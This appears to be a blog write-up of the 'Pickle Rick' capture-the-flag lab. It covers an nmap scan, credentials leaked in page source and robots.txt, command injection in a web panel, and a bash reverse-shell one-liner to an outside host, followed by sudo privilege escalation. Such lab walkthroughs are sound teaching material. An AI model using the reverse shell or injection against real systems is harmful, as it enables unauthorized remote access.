This Rick and Morty-themed challenge requires you to exploit a web server and find three ingredients to help Rick make his potion and transform himself back into a human from a pickle.

Deploy the virtual machine on this task and explore the web application: 10.10.237.59

Started nmap scan.

```bash
 nmap 10.10.237.59Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-06 21:24 ISTNmap scan report for 10.10.237.59Host is up (0.16s latency).Not shown: 998 closed tcp ports (conn-refused)PORT   STATE SERVICE22/tcp open  ssh80/tcp open  httpNmap done: 1 IP address (1 host up) scanned in 40.93 seconds
```

```

Now /assets, /robots.txt and login.php and login.php are 200 ok so i visited them one by one first the main page.

![Open Lightbox](../assets/PickleRick2.webp){ .glightbox .center width="500" }

Now on the i looked at the page source and found the username.

![Open Lightbox](../assets/PickleRick3.webp){ .glightbox .center width="500" }

And on the assets i didnt find anything significant i visted the robots.txt and found the password for the username.

![Open Lightbox](../assets/PickleRick4.webp){ .glightbox .center width="500" }

Now on logged in using the username and the password i got on /login.php

And after login found command panel i tested it and a possible command injection.

![Open Lightbox](../assets/PickleRick5.webp){ .glightbox .center width="500" }


![Open Lightbox](../assets/PickleRick6.webp){ .glightbox .center width="500" }

And yes it worked but it also disabled the commands.

![Open Lightbox](../assets/PickleRick7.webp){ .glightbox .center width="500" }

So lets try to get a shell on this im using.

```bash
bash -c 'bash -i >& /dev/tcp/10.8.197.78/8081 0>&1'
```

And get your listener ready it pop a shell.

![Open Lightbox](../assets/PickleRick8.webp){ .glightbox .center width="500" }

Got the first ingredient.

![Open Lightbox](../assets/PickleRick9.webp){ .glightbox .center width="500" }

Now looked around and in /home/rick found the second file.

![Open Lightbox](../assets/PickleRick10.webp){ .glightbox .center width="500" }

Now the to escalate privilege i found that the user www/data can exeute any sudo commands.

![Open Lightbox](../assets/PickleRick11.webp){ .glightbox .center width="500" }

And found the 3rd ingredient too.

Thank you for reading
